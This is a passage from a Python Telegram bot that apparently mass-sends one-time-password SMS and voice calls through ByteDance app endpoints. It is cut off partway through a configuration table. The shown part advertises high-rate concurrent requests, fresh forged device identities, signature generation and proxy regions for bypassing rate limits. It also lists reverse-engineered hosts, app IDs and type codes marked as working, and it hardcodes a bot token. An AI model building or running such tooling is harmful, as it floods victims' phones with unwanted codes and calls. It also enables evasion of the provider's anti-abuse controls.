#!/usr/bin/env python3
"""
ByteDance Multi-App OTP Telegram Bot - Ultra Fast Edition v17.0
===============================================================
Features:
1. 5-10 Concurrent OTP Requests Per Second
2. Fully Async Architecture - Zero Blocking
3. Multi-User Support - 1000+ Users Simultaneously
4. Real-time Logging Every 10 Requests
5. Time Schedule Feature for Bulk Tasks
6. Multi-App Support (Douyin, Pipix, Toutiao, Xigua, Helo + more)
7. Working SignerPy v8404 Signature Pattern
8. Device Registration + Fresh Identity Per Request
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import random
import string
import struct
import time
import uuid
import re
import io
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode
from typing import Optional, List, Dict, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from collections import defaultdict
import pytz

import requests
import urllib3
import aiohttp

urllib3.disable_warnings()
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# Import SignerPy for signature generation
try:
    import SignerPy as SP
    from SignerPy import xor, sign
    SIGNERPY_AVAILABLE = True
except ImportError:
    SIGNERPY_AVAILABLE = False
    print("WARNING: SignerPy not available!")

# ============================================
# CONFIGURATION
# ============================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8505579150:AAGBjVce28JRWHW8-50F9WQYBJKIJkxzfPg")

# Pakistan Timezone
PAKISTAN_TZ = pytz.timezone('Asia/Karachi')

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Performance settings - ULTRA FAST
MAX_CONCURRENT_OTP = 50          # 5 concurrent OTP requests at once
MAX_CONCURRENT_TASKS = 100       # Support 100+ concurrent tasks
BATCH_SIZE = 60                 # Process 5 numbers at a time
LOG_INTERVAL = 50                # Log every 5 requests
MAX_MESSAGE_LENGTH = 4000
REQUEST_TIMEOUT = 15             # 15 second timeout per request

# ============================================
# BYTEDANCE MULTI-APP DATABASE
# ============================================

# Best proxy regions for bypassing rate limits (tested: AU, DE, SG give most SUCCESS)
RECOMMENDED_PROXY_REGIONS = ["AU", "DE", "SG", "GB", "NL", "JP", "FR", "CA"]

# Mobile API domains for signed endpoint /passport/mobile/send_code/v1/
TIKTOKV_MOBILE_DOMAINS = [
    "api16-normal-c-alisg.tiktokv.com",
    "api-t2.tiktokv.com",
    "api-va.tiktokv.com",
    "api16-normal-c-useast2a.tiktokv.com",
    "api16-normal-c-useast1a.tiktokv.com",
    "api16-normal-v4.tiktokv.com",
    "api16-normal-v6.tiktokv.com",
    "api16.tiktokv.com",
    "api19-normal-c-alisg.tiktokv.com",
    "api19-normal-c-useast1a.tiktokv.com",
    "api19-normal-c-useast2a.tiktokv.com",
    "api19.tiktokv.com",
    "api21-normal-c-alisg.tiktokv.com",
    "api21-normal-c-useast2a.tiktokv.com",
    # Discovered domains (signature accepted)
    "api22-normal-c-useast2a.tiktokv.com",
    "api22-normal-c-alisg.tiktokv.com",
    "api-h2.tiktokv.com",
    "api2-16-h2.musical.ly",
    "api2-19-h2.musical.ly",
    "api2-21-h2.musical.ly",
    "api.lemon8-app.com",
    # APK RE v3.0: NEW host families (verified rate-limited/SUCCESS)
    "api16-normal-useast5.tiktokv.us",   # NEW .tiktokv.us TLD — SUCCESS confirmed!
    "api16-normal-useast8.tiktokv.us",   # NEW .tiktokv.us TLD
    "api21.tiktokv.com",                 # NEW — SUCCESS confirmed (can_send_voice_code)
    "api21-h2.tiktokv.com",              # NEW h2 variant
    "api22.tiktokv.com",                 # NEW base
    "api22-va.tiktokv.com",              # NEW
    "api23-normal-useast1a.tiktokv.com", # NEW api23 family
    "api31-normal-alisg.tiktokv.com",    # NEW api31 family (rate-limited = works)
    "api31-normal-useast1a.tiktokv.com", # NEW api31 family
    "api32-normal-alisg.tiktokv.com",    # NEW api32 family (rate-limited = works)
    "api32-normal-useast1a.tiktokv.com", # NEW api32 family
    "api-normal.tiktokv.com",            # NEW base (rate-limited = works)
    "api-core.tiktokv.com",              # NEW core variant
    "api-core-va.tiktokv.com",           # NEW core variant
    "fp-va.tiktokv.com",                 # NEW feature platform (rate-limited = works)
    "fp-sg.tiktokv.com",                 # NEW feature platform
    "fp22-normal-useast1a.tiktokv.com",  # NEW fp22
    "api19-va.tiktokv.com",              # NEW api19 variant
    "api16-normal-alisg.helo-api.com",   # NEW! Helo official backend
]

# NEW: snssdk.com domains — Chinese ByteDance infra (confirmed SUCCESS for Douyin, Pipix, Toutiao)
SNSSDK_DOMAINS = [
    "is-hl.snssdk.com",
    "i-hl.snssdk.com",
    "ib.snssdk.com",
    "is.snssdk.com",
    "aweme.snssdk.com",
    "is-lq.snssdk.com",
    "lf.snssdk.com",
    "i.snssdk.com",
]

# NEW: zijieapi.com domains — Volcengine/ByteDance infra (confirmed SUCCESS for Douyin, Toutiao)
ZIJIEAPI_DOMAINS = [
    "verify.zijieapi.com",
]

# hotapi-* host family — completely new from APK RE (rate-limited = signature accepted)
HOTAPI_DOMAINS = [
    "hotapi-va.tiktokv.com",
    "hotapi-sg.tiktokv.com",
    "hotapi16-normal-alisg.tiktokv.com",
    "hotapi16-normal-useast1a.tiktokv.com",
    "hotapi22-normal-useast1a.tiktokv.com",
]

# Lemon8 APK RE v4.0: NEW host families from Lemon8 v12.4.1 (com.bd.nproject)
LEMON8_API_DOMAINS = [
    "api77-normal-c-alisg.tiktokv.com",     # NEW api77 family! (RL confirmed)
    "api77-normal-c-useast1a.tiktokv.com",  # NEW api77 family! (SUCCESS: AID=2239)
    "api77-core-c-alisg.tiktokv.com",       # NEW api77 core
    "api77-core-c-useast1a.tiktokv.com",    # NEW api77 core
    "lemon8-api.tiktokv.com",               # Lemon8 dedicated API (SUCCESS: AID=2239, 7743)
    "verify-sg.tiktokv.com",                # NEW verify endpoint (SUCCESS: AID=6027, 2239)
    "verify-sg.byteoversea.com",            # NEW verify byteoversea
]

# Lemon8 Multi-Version APK RE v7.0: NEW Lemon8-DEDICATED hosts (extracted from v11.8.2 → v12.5.1)
# These are LEMON8-EXCLUSIVE infrastructure not shared with TikTok!
LEMON8_DEDICATED_DOMAINS = [
    "lemonapi16-normal-useast5.tiktokv.us",     # SUCCESS: AID 1583, 1988, 4143, 6849, 7743
    "lemonapi16-normal-useast8.tiktokv.us",     # SUCCESS: AID 1760, 1988, 2239, 7743
    "lemonapi16-normal-alisg.tiktokv.com",      # SUCCESS: AID 7743
    "lemonapi16-normal-no1a.tiktokv.eu",        # NEW! Norway 1a in .eu TLD
    "lemonapi16-normal-useastred.tiktokv.eu",   # NEW! .eu TLD with useastred
]

# Lemon8 own-domain web hosts (from Lemon8 multi-version APK RE)
LEMON8_WEB_HOSTS = [
    "v.lemon8-app.com",                         # SUCCESS: AID 2239, 7743
    "s.lemon8-app.com",                         # SUCCESS: AID 2239
    "api.lemon8-app.com",                       # SUCCESS: AID 6027, 7743
    "web.lemon8-app.com",
    "www.lemon8-app.com",
]

# Lemon8 APK RE: sgsnssdk.com family (Lemon8-specific infrastructure)
SGSNSSDK_DOMAINS = [
    "f-p.sgsnssdk.com",                     # SUCCESS: AID=2239 (Lemon8 exclusive!)
    "hotapi.sgsnssdk.com",
    "i.sgsnssdk.com",
    "mon.sgsnssdk.com",
]

# Web domains for /passport/web/send_code/ (NO signing needed)
TIKTOKV_WEB_DOMAINS = ["www.tiktok.com", "us.tiktok.com", "www.capcut.com", "shop.tiktok.com"]

# Feature platform domains (fp-*) — confirmed SUCCESS for AID=1760, 7743
FP_DOMAINS = [
    "fp-va.tiktokv.com",                    # SUCCESS: AID=1760 (web)
    "fp-sg.tiktokv.com",                    # SUCCESS: AID=1760 (web)
    "fp22-normal-useast1a.tiktokv.com",     # SUCCESS: AID=7743, 1760
]

# CapCut APK RE v5.0: Dedicated CapCut passport infrastructure (com.lemon.lvoverseas v17.7.0)
CAPCUT_PASSPORT_DOMAINS = [
    "passport-api.capcut.com",                  # SUCCESS: AID=1583, 6027, 2239, 1760
    "passport-api.capcutapi.com",               # SUCCESS: AID=1583, 6027
    "passport-api-va-us-looki.capcutapi.com",   # SUCCESS: AID=6027
    "passport-api-v2-boot.capcutapi.com",       # SUCCESS: AID=2239
    "tt-passport16-normal-sg.capcutapi.com",    # SUCCESS: AID=6027, 1760
]

# CapCut APK: tiktokv.com hosts specific to CapCut
CAPCUT_TIKTOKV_HOSTS = [
    "api-boot.tiktokv.com",                     # SUCCESS: AID=2239 (web)
    "api-core-boot.tiktokv.com",
    "inapp.tiktokv.com",                        # SUCCESS: AID=6027 (web)
    "api16-core-c-alisg.tiktokv.com",
    "api22-core-c-alisg.tiktokv.com",
]

# TikTok Seller APK RE v6.0: TikTok Shop dedicated infrastructure (com.tiktokshop.seller v10.6.0)
SELLER_SHOP_DOMAINS = [
    "api.tiktokglobalshopv.com",                    # SUCCESS: AID=7743, 2239, 1583
    "api.tiktokglobalshopv.us",                     # SUCCESS: AID=7743, 1583, 6849, 1760
    "api.row.tiktokglobalshopv.com",                # RL confirmed (ROW variant)
    "api.eu.tiktokglobalshopv.com",                 # SUCCESS: AID=6027
]

# TikTok Seller: Verification hosts (NEW!)
SELLER_VERIFICATION_DOMAINS = [
    "verification-va.tiktokv.com",                  # SUCCESS: AID=2239, 6027, 7743
    "verification-i18n.tiktokv.com",
    "verification16-normal-useast5.tiktokv.us",     # SUCCESS: AID=1760
    "verification16-normal-useast8.tiktokv.us",
    "rc-verification-va.tiktokv.com",               # SUCCESS: AID=2239, 6027
    "rc-verification-sg.tiktokv.com",               # SUCCESS: AID=2239, 6027, 7743
    "rc-verification-i18n.tiktokv.com",             # SUCCESS: AID=6027
    "rc-verification16-normal-useast5.tiktokv.us",  # SUCCESS: AID=7743, 1988, 4143, 1760, 6849
]

# TikTok Seller: Additional hosts
SELLER_EXTRA_DOMAINS = [
    "oec-api.tiktokv.com",                          # Open E-Commerce API (RL)
    "scc.tiktokv.com",                              # Seller Center Core (RL)
    "web-va.tiktok.com",                            # SUCCESS: AID=7743
    "ads.tiktok.com",                               # SUCCESS: AID=2239, 7743
]

# Combined for backward compat (DO NOT use for signed apps)
TIKTOKV_DOMAINS = TIKTOKV_MOBILE_DOMAINS + TIKTOKV_WEB_DOMAINS

# Chinese app domains (amemv + snssdk + zijieapi + ixigua)
CHINESE_APP_DOMAINS = [
    "api.amemv.com", "api3-normal-c-lf.amemv.com", "api5-normal-c-lf.amemv.com",
    "www.ixigua.com",  # Mega Fuzzer Phase 1: Douyin SUCCESS on ixigua.com
] + SNSSDK_DOMAINS + ZIJIEAPI_DOMAINS

# ============================================
# CONFIRMED SUCCESS APPS — /setapp2 (exact tested combos only)
# ============================================
CONFIRMED_APPS = {
    "tiktok_ads": {
        # 9+ SUCCESSES: SG/DE/AU, web endpoint, no signing + Lemon8 v4.0: api22 SUCCESS
        "name": "TikTok Ads (CONFIRMED)", "aid": 1583, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3532, 3635, 3536, 3631, 3733],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com", "shop.tiktok.com",
                    "api22-normal-c-alisg.tiktokv.com",   # Lemon8 v4.0: SUCCESS tc=3635/3733
                    "api77-normal-c-alisg.tiktokv.com",   # Lemon8 v4.0: RL
                    "lemon8-api.tiktokv.com"],            # Lemon8 v4.0: RL
        "needs_proxy": True, "web_endpoint": True,
    },
    "douyin_s": {
        # SUCCESS: api.amemv.com tc=3532 AU + 7 snssdk.com domains + verify.zijieapi.com
        "name": "Douyin (CONFIRMED)", "aid": 1128, "app_name": "aweme",
        "package": "com.ss.android.ugc.aweme", "version_code": "290100", "version_name": "29.1.0",
        "channel": "update", "type_codes": [3532, 3635, 3634],
        "domains": ["api.amemv.com", "api3-normal-c-lf.amemv.com",
                    "is.snssdk.com", "ib.snssdk.com", "aweme.snssdk.com", "i-hl.snssdk.com",
                    "is-lq.snssdk.com", "lf.snssdk.com", "is-hl.snssdk.com",
                    "verify.zijieapi.com"],
    },
    "douyin_web_s": {
        # SUCCESS: us.tiktok.com tc=3635 region=DE + api16-normal-useast5.tiktokv.us tc=3734 (APK RE v3.0)
        "name": "Douyin Web (CONFIRMED)", "aid": 1988, "app_name": "douyin_web",
        "package": "douyin_web", "version_code": "1", "version_name": "1.0",
        "channel": "douyin_web",
        "type_codes": [3635, 3532, 3734],
        "domains": ["us.tiktok.com", "www.tiktok.com",
                    "api16-normal-useast5.tiktokv.us",   # APK RE v3.0: SUCCESS on .tiktokv.us!
                    "api16-normal-useast8.tiktokv.us",    # Lemon8 v4.0: SUCCESS confirmed!
                    "api19-normal-c-useast1a.tiktokv.com",  # APK RE v3.0: SUCCESS
                    "api2-16-h2.musical.ly",              # APK RE v3.0: SUCCESS
                    "api77-normal-c-useast1a.tiktokv.com",  # Lemon8 v4.0: RL (api77 family)
                    "api77-normal-c-alisg.tiktokv.com",   # Lemon8 v4.0: RL
                    "verify-sg.tiktokv.com"],             # Lemon8 v4.0: RL
        "needs_proxy": True, "web_endpoint": True,
    },
    "huoshan_s": {
        # SUCCESS: api5-normal-c-lf.amemv.com tc=3635 region=DE
        "name": "Douyin Huoshan (CONFIRMED)", "aid": 1112, "app_name": "live_stream",
        "package": "com.ss.android.ugc.live", "version_code": "110300", "version_name": "11.3.0",
        "channel": "update", "type_codes": [3635, 3532],
        "domains": ["api5-normal-c-lf.amemv.com", "api3-normal-c-lf.amemv.com", "api.amemv.com"],
    },
    "xigua_s": {
        # SUCCESS: api3-normal-c-lf.amemv.com tc=3635 AU + www.ixigua.com (Mega Fuzzer)
        "name": "Xigua Video (CONFIRMED)", "aid": 32, "app_name": "video_article",
        "package": "com.ss.android.article.video", "version_code": "7500", "version_name": "7.5.0",
        "channel": "update", "type_codes": [3635, 3532, 3634],
        "domains": ["api3-normal-c-lf.amemv.com", "api.amemv.com", "www.ixigua.com"],
        "register_domain": "api.amemv.com",
    },
    "bd7743_s": {
        # SUCCESS: api16-normal-v4 tc=3635 + Lemon8 v4.0: fp22/api22/api-h2 tc=3536/3734/3731
        "name": "BD 7743 (CONFIRMED)", "aid": 7743, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3536, 3132, 3532, 3733, 34, 3637, 3734, 3731, 3530],
        "domains": ["api16-normal-v4.tiktokv.com", "api16-normal-v6.tiktokv.com",
                    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-c-useast1a.tiktokv.com",
                    "fp22-normal-useast1a.tiktokv.com",   # Lemon8 v4.0: SUCCESS tc=3532
                    "api22-normal-c-alisg.tiktokv.com",   # Lemon8 v4.0: SUCCESS tc=3536/3731
                    "api-h2.tiktokv.com",                 # Lemon8 v4.0: SUCCESS tc=3536/3734
                    "api32-normal-alisg.tiktokv.com"],    # Lemon8 v4.0: RL
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "capcut_s": {
        # SUCCESS: tiktokv.com + /passport/mobile/send_code/ + CapCut v5.0: dedicated passport hosts
        "name": "CapCut (CONFIRMED)", "aid": 3006, "app_name": "vicut",
        "package": "com.lemon.lvoverseas", "version_code": "17700200", "version_name": "17.7.0",
        "channel": "googleplay",
        "type_codes": [3532, 3733, 3635, 3637, 3634],
        "domains": ["api2-16-h2.musical.ly", "api16-normal-c-useast1a.tiktokv.com",
                    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-v4.tiktokv.com",
                    "api16-normal-v6.tiktokv.com",
                    "passport-api.capcut.com",              # CapCut v5.0: RL confirmed
                    "passport-api.capcutapi.com",           # CapCut v5.0: RL confirmed
                    "tt-passport16-normal-sg.capcutapi.com"],# CapCut v5.0: RL confirmed
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
        "alt_endpoint": "/passport/mobile/send_code/",  # Also works without v1!
    },
    "tiktok_s": {
        # SUCCESS: tiktokv.com + /passport/mobile/send_code/ (without v1) confirmed
        # APK RE v5.0: api-va.tiktokv.com confirmed working with tc=3635
        "name": "TikTok Global (CONFIRMED)", "aid": 1233, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3637, 3634, 3734, 3532],
        "domains": ["api-va.tiktokv.com",                                   # APK RE v5.0: SUCCESS tc=3635
                    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
                    "api-t2.tiktokv.com", "api19-normal-c-useast2a.tiktokv.com",
                    "api21.tiktokv.com", "api-h2.tiktokv.com",              # APK RE v3.0: SUCCESS
                    "api22-normal-c-alisg.tiktokv.com",                     # APK RE v3.0: RL
                    "api31-normal-alisg.tiktokv.com",                       # APK RE v3.0: RL
                    "api32-normal-useast1a.tiktokv.com"],                   # APK RE v3.0: RL
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
        "alt_endpoint": "/passport/mobile/send_code/",  # Also works without v1!
    },
    "tiktok_lite_s": {
        # SUCCESS: tiktokv.com + /passport/mobile/send_code/ (without v1) confirmed
        "name": "TikTok Lite (CONFIRMED)", "aid": 1340, "app_name": "trill",
        "package": "com.zhiliaoapp.musically.go", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3532, 3637, 3634],
        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
                    "api16-normal-v4.tiktokv.com", "api19-normal-c-alisg.tiktokv.com"],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
        "alt_endpoint": "/passport/mobile/send_code/",  # Also works without v1!
    },
    "pipix_s": {
        # SUCCESS: pipix.com + 5 snssdk.com domains confirmed
        "name": "Pipix (CONFIRMED)", "aid": 1319, "app_name": "super",
        "package": "com.sup.android.superb", "version_code": "620", "version_name": "6.2.0",
        "channel": "update", "type_codes": [3532, 3635, 3637, 3634],
        "domains": ["api5.pipix.com", "api3.pipix.com",
                    "is-hl.snssdk.com", "aweme.snssdk.com", "ib.snssdk.com",
                    "is-lq.snssdk.com", "i.snssdk.com"],
    },
    "toutiao_s": {
        # SUCCESS: verify.zijieapi.com tc=3635 region=SG
        "name": "Toutiao (CONFIRMED)", "aid": 13, "app_name": "news_article",
        "package": "com.ss.android.article.news", "version_code": "9500", "version_name": "9.5.0",
        "channel": "update", "type_codes": [3635, 3532, 3634],
        "domains": ["verify.zijieapi.com", "api.amemv.com", "api3-normal-c-lf.amemv.com"],
        "register_domain": "api.amemv.com",
    },
    # ======== VOICE CALL ENDPOINTS (Ultra Brute v2.0 Phase 2 discovery) ========
    "tiktok_voice": {
        # Voice call OTP via /passport/mobile/send_voice_code/ — rate-limited (=works with fresh IP)
        "name": "TikTok Voice Call (CONFIRMED)", "aid": 1233, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3731, 3532],
        "domains": ["api16-normal-v6.tiktokv.com", "api16-normal-c-useast2a.tiktokv.com",
                    "www.tiktok.com", "us.tiktok.com"],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True, "voice_endpoint": True,
    },
    "tiktok_lite_voice": {
        "name": "TikTok Lite Voice Call (CONFIRMED)", "aid": 1340, "app_name": "trill",
        "package": "com.zhiliaoapp.musically.go", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3532],
        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com"],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True, "voice_endpoint": True,
    },
    "helo_voice": {
        "name": "Helo Voice Call (CONFIRMED)", "aid": 1180, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3731, 3532],
        "domains": ["api16-normal-v4.tiktokv.com", "api16-normal-c-useast2a.tiktokv.com",
                    "us.tiktok.com", "api16-normal-v6.tiktokv.com"],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True, "voice_endpoint": True,
    },
    "bd259_voice": {
        "name": "BD 259 Voice Call (CONFIRMED)", "aid": 259, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3731, 3532],
        "domains": ["api16-normal-v6.tiktokv.com", "api16-normal-v4.tiktokv.com",
                    "www.tiktok.com", "us.tiktok.com"],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True, "voice_endpoint": True,
    },
    # ======== END VOICE CALL SECTION ========
    # ======== APK RE v3.0: NEW AIDs discovered from TikTok APK config blobs ========
    "bd473824_s": {
        # APK RE v3.0: Found hardcoded in TikTok 45.0.42 config. SUCCESS on /passport/mobile/can_send_voice_code/
        # APK RE v5.0: tc=3536 CONFIRMED working on mobile signed. Other TCs burned (ec=7).
        # Some PK numbers get ec=1096 region error on tc=3536 — ~60% success rate.
        "name": "BD 473824 (CONFIRMED)", "aid": 473824, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3536, 3635, 3532, 3637, 3634, 3734],
        "domains": ["api-va.tiktokv.com",                                    # APK RE v5.0: SUCCESS tc=3536
                    "api22-normal-c-useast2a.tiktokv.com",                   # APK RE v5.0: SUCCESS tc=3536
                    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
                    "api21.tiktokv.com", "api-h2.tiktokv.com",
                    "api22-normal-c-alisg.tiktokv.com", "api16-normal-v4.tiktokv.com",
                    "www.tiktok.com", "us.tiktok.com"],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "bd567753_s": {
        # APK RE v3.0: Found hardcoded in TikTok 45.0.42 config. SUCCESS on /passport/mobile/can_send_voice_code/
        # APK RE v5.0: tc=1 CONFIRMED working with passport-sdk-version=19 header!
        # Common TCs (3635, 3536 etc) all burned — only rare TC=1 works.
        "name": "BD 567753 (CONFIRMED)", "aid": 567753, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "passport_sdk_version": "19",
        "type_codes": [1, 3635, 3532, 3637, 3634, 3734],
        "domains": ["api-va.tiktokv.com",                                    # APK RE v5.0: SUCCESS tc=1
                    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
                    "api21.tiktokv.com", "api-h2.tiktokv.com",
                    "api22-normal-c-alisg.tiktokv.com", "api16-normal-v4.tiktokv.com",
                    "www.tiktok.com", "us.tiktok.com"],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "bd473824_voice": {
        # APK RE v3.0: Voice call on NEW AID 473824 (SUCCESS confirmed on can_send_voice_code)
        "name": "BD 473824 Voice (CONFIRMED)", "aid": 473824, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3532, 3637],
        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
                    "api21.tiktokv.com", "api-h2.tiktokv.com",
                    "www.tiktok.com", "us.tiktok.com"],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True, "voice_endpoint": True,
    },
    "bd567753_voice": {
        # APK RE v3.0: Voice call on NEW AID 567753 (SUCCESS confirmed on can_send_voice_code)
        "name": "BD 567753 Voice (CONFIRMED)", "aid": 567753, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3532, 3637],
        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com",
                    "api21.tiktokv.com", "api-h2.tiktokv.com",
                    "www.tiktok.com", "us.tiktok.com"],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True, "voice_endpoint": True,
    },
    # ======== END APK RE v3.0 SECTION ========
    # ======== APK RE v5.0: NEW AIDs from TikTok APK deep analysis ========
    # KEY DISCOVERY: passport-sdk-version HTTP header = "19" unlocks these AIDs!
    # Without this header: aid=845221 → ec=14, aid=1180 → 403, aid=567753 → 403
    # With header "19": all three → SUCCESS with mobile_ticket
    "bd845221_s": {
        # APK RE v5.0: aid=845221 CONFIRMED working on mobile signed with passport-sdk-version=19
        # Also works on voice call endpoint!
        "name": "BD 845221 (CONFIRMED)", "aid": 845221, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "passport_sdk_version": "19",
        "type_codes": [3536, 3635, 3532, 3637, 3634],
        "domains": ["api-va.tiktokv.com"],                                   # APK RE v5.0: SUCCESS tc=3536
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "bd845221_voice": {
        # APK RE v5.0: Voice call OTP confirmed on aid=845221 with passport-sdk-version=19
        "name": "BD 845221 Voice (CONFIRMED)", "aid": 845221, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "passport_sdk_version": "19",
        "type_codes": [3536, 3635, 3532],
        "domains": ["api-va.tiktokv.com"],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True, "voice_endpoint": True,
    },
    "bd1180_s": {
        # APK RE v5.0: aid=1180 (CapCut/Helo) CONFIRMED working on mobile signed
        # Was returning 403 Access Denied — fixed by passport-sdk-version=19 header
        "name": "BD 1180 (CONFIRMED)", "aid": 1180, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "passport_sdk_version": "19",
        "type_codes": [3635, 3532, 3637, 3634],
        "domains": ["api-va.tiktokv.com"],                                   # APK RE v5.0: SUCCESS tc=3635
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    # ======== END APK RE v5.0 SECTION ========
    "bd2658_s": {
        # CONFIRMED SUCCESS in signed brute force (PR#5), Lemon8 v4.0: fp-va RL confirmed
        "name": "BD 2658/Lemon8 (CONFIRMED)", "aid": 2658, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3532, 3637, 3634, 3734],
        "domains": ["api16-normal-v6.tiktokv.com", "api16-normal-c-useast2a.tiktokv.com",
                    "api-t2.tiktokv.com", "api16-normal-v4.tiktokv.com",
                    "fp-va.tiktokv.com",                  # Lemon8 v4.0: RL confirmed
                    "api-normal.tiktokv.com",             # Lemon8 v4.0: RL confirmed
                    "api16-normal-c-useast1a.tiktokv.com"],  # Lemon8 v4.0: RL confirmed
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    # ======== Lemon8 APK RE v4.0: NEW CONFIRMED APPS ========
    "bd2239_s": {
        # Lemon8 v4.0: 6 SUCCESSes across api77/lemon8-api/verify-sg/f-p.sgsnssdk/tiktokv.us
        "name": "BD 2239 (CONFIRMED)", "aid": 2239, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3634, 3635, 3637, 3734, 3532],
        "domains": ["api77-normal-c-useast1a.tiktokv.com",  # SUCCESS tc=3634
                    "lemon8-api.tiktokv.com",               # SUCCESS tc=3635
                    "verify-sg.tiktokv.com",                # SUCCESS tc=3635
                    "f-p.sgsnssdk.com",                     # SUCCESS tc=3634
                    "api16-normal-useast8.tiktokv.us",      # SUCCESS tc=3634
                    "api-h2.tiktokv.com",                   # SUCCESS tc=3634
                    "api16-normal-c-useast1a.tiktokv.com",  # SUCCESS tc=3634
                    "api22-normal-c-alisg.tiktokv.com",     # SUCCESS tc=3637
                    "api16-normal-v4.tiktokv.com",          # SUCCESS tc=3734
                    "us.tiktok.com", "www.tiktok.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd1760_s": {
        # Lemon8 v4.0: 7 SUCCESSes across fp-va/fp-sg/tiktokv.us/api16/api22/api-h2
        "name": "BD 1760 (CONFIRMED)", "aid": 1760, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3734, 3634, 3637, 3635, 3733],
        "domains": ["fp-va.tiktokv.com",                    # SUCCESS tc=3734
                    "fp-sg.tiktokv.com",                    # SUCCESS tc=3734
                    "fp22-normal-useast1a.tiktokv.com",     # SUCCESS tc=3634
                    "api16-normal-useast5.tiktokv.us",      # SUCCESS tc=3634
                    "api16-normal-useast8.tiktokv.us",      # SUCCESS tc=3637
                    "api16-normal-c-useast1a.tiktokv.com",  # SUCCESS tc=3734/3637/3634
                    "api-h2.tiktokv.com",                   # SUCCESS tc=3733
                    "api22-normal-c-alisg.tiktokv.com",     # SUCCESS tc=3734
                    "api16-normal-v4.tiktokv.com",          # SUCCESS tc=3637
                    "verify-sg.tiktokv.com"],               # SUCCESS tc=3634
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd6027_s": {
        # Lemon8 v4.0: SUCCESS on verify-sg.tiktokv.com + multiple other domains
